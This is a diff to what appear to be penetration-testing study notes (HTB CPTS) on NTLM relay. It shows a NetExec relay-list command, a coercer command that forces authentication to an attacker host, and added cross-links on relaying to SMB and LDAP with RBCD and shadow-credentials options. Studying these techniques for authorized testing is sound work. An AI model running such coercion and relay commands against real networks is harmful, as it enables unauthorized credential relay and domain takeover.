@@ -17,6 +17,8 @@ netexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt
 > [!note] **ntlmrelayx requires SMB signing disabled** — Domain Controllers have SMB signing enabled by default. Workstations and member servers often do not. Always generate a relay list first with NetExec before running ntlmrelayx. You cannot relay back to the same host that sent the auth.
 
 > [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] ESC8/ESC11, for relaying coerced auth to the CA Web Enrollment/RPC endpoint.
+> Also [[Services/File Xfer/SMB|SMB]] — relaying captured NetNTLM to SMB (signing-off targets).
+> Also [[Services/Network management/LDAP|LDAP]] — relay to `ldap://` (`--delegate-access` RBCD) or `ldaps://` (`--shadow-credentials`) when signing/channel-binding isn't enforced.
 > Also used in [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2).
 
 ---
@@ -192,5 +194,5 @@ coercer coerce -t 192.168.1.50 -l KALI-IP -u user -p Password -d domain.local
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-07-31*
+*Updated: 2026-09-23*
 *Model: claude-opus-5*
